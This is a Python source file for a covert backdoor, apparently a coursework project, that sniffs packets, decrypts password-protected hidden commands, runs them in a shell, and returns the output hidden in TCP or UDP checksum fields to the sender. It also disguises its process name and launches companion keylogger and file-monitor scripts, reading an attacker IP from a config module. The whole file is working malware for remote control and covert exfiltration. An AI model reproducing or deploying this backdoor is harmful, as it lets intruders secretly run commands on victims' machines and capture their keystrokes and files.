import scapy.all as scapy
import subprocess
import setproctitle
import time
from cryptography.fernet import Fernet
import threading
import configBackdoor
import ipaddress
import sys

dest = configBackdoor.attackerIP

def parse_pkt(pkt):
    pktstr = str(bytes(pkt))
    
    if pkt.haslayer(scapy.TCP):
        password = (pktstr[pktstr.index('$$$'): len(pktstr) -1])
        passwordDecrypted = cipher_suite.decrypt(password.encode('utf-8'))
        newString = pktstr[pktstr.index('@@@'):pktstr.index('***')]
        newString = newString.replace('@@@', '')

        if configBackdoor.password.encode('utf-8') == passwordDecrypted:
            src = pkt['IP'].src

            cmd = newString

            print(f"The received data is: {cmd}")
            unciphered_text = cipher_suite.decrypt(cmd.encode('utf-8'))
            print(f"The decrypted data that was hidden is: {unciphered_text.decode('utf-8')}")

            process = subprocess.Popen(unciphered_text,
                                    shell=True,
                                    stdout=subprocess.PIPE,
                                    stderr=subprocess.PIPE,
                                    stdin=subprocess.PIPE)
            stdout, stderr = process.communicate()

            data = stdout + stderr

            if data == b'':
                data = "No stdout from: " + unciphered_text.decode('utf-8')

            if "b'" in str(data):
                data = '@@@' + data.decode('utf-8') + '***'
            else:
                data = '@@@' + str(data) + '***'
            
            print(data)

            packet = scapy.IP(dst=src)/scapy.TCP(chksum=scapy.RawVal(data), sport=configBackdoor.sport, dport=configBackdoor.destPort)/password
            time.sleep(0.1)
            scapy.send(packet, verbose=0)
    else:
        password = (pktstr[pktstr.index('***'): len(pktstr) -1])
        password = password.replace('***', '')
        passwordDecrypted = cipher_suite.decrypt(password.encode('utf-8'))
        newString = pktstr[pktstr.index('@@@'):pktstr.index('***')]
        newString = newString.replace('@@@', '')

        if configBackdoor.password.encode('utf-8') == passwordDecrypted:
            src = pkt['IP'].src

            cmd = newString

            print(f"The received data is: {cmd}")
            unciphered_text = cipher_suite.decrypt(cmd.encode('utf-8'))
            print(f"The decrypted data that was hidden is: {unciphered_text.decode('utf-8')}")

            process = subprocess.Popen(unciphered_text,
                                    shell=True,
                                    stdout=subprocess.PIPE,
                                    stderr=subprocess.PIPE,
                                    stdin=subprocess.PIPE)
            stdout, stderr = process.communicate()

            data = stdout + stderr

            if data == b'':
                data = "No stdout from: " + unciphered_text.decode('utf-8')

            if "b'" in str(data):
                data = '@@@' + data.decode('utf-8') + '***'
            else:
                data = '@@@' + str(data) + '***'
            
            print(data)

            packet = scapy.IP(dst=src)/scapy.UDP(chksum=scapy.RawVal(data), sport=configBackdoor.sport, dport=configBackdoor.destPort)/password
            time.sleep(0.1)
            scapy.send(packet, verbose=0)

def validate_args(pkt):
    pktstr = str(bytes(pkt))
    if pkt.haslayer(scapy.TCP):
        password = pktstr[pktstr.index('$$$'): len(pktstr) -1]
        passwordDecrypted = cipher_suite.decrypt(password.encode('utf-8'))
        if (configBackdoor.password.encode('utf-8') in passwordDecrypted) and (pkt['TCP'].sport == configBackdoor.sportHex):
            return True
        else:
            return False
    else:  
        password = pktstr[pktstr.index('***'): len(pktstr) -1]
        passwordDecrypted = cipher_suite.decrypt(password.encode('utf-8'))
        if (configBackdoor.password.encode('utf-8') in passwordDecrypted) and (pkt['UDP'].sport == configBackdoor.sportHex):
            return True
        else:
            return False

def load_key():
    return open("key.key", "rb").read()

def sniff():
    while True:
        scapy.sniff(filter=f"port {configBackdoor.destPort}", prn=parse_pkt, stop_filter=(validate_args))

def checkPort(port):
    try:
        if 1 <= port <= 65535:
            pass
        else:
            raise ValueError
    except ValueError:
        print("This is NOT a VALID port number.")
        sys.exit()

def validate_ip_address(address):
    ip = 'inputted'
    try:
        ip = ipaddress.ip_address(address)
        return True
    except ValueError:
        print(f"IP address {ip} is not valid".format(address))

if __name__ == "__main__":
    processName = configBackdoor.processName
    setproctitle.setproctitle(processName)
    
    checkPort(configBackdoor.destPort)
    checkPort(configBackdoor.filePort)

    if len(configBackdoor.knock_port) != 3:
        print('Need to have 3 knock ports')
        sys.exit()
    
    if configBackdoor.protocol != 'TCP' and configBackdoor.protocol != 'UDP':
        print('Check config for protocol')
        sys.exit()

    for x in range(0,len(configBackdoor.knock_port)):
        checkPort(configBackdoor.knock_port[x])

    if not validate_ip_address(dest):
        sys.exit()

    p = subprocess.Popen('python keylogger.py', shell=True)
    p2 = subprocess.Popen('python fileMonitor.py', shell=True)

    try:
        key = load_key()
        cipher_suite = Fernet(key)

        t1 = threading.Thread(target=sniff)
        t1.start()
        t1.join()
    except KeyboardInterrupt:
        p.kill()
        p2.kill()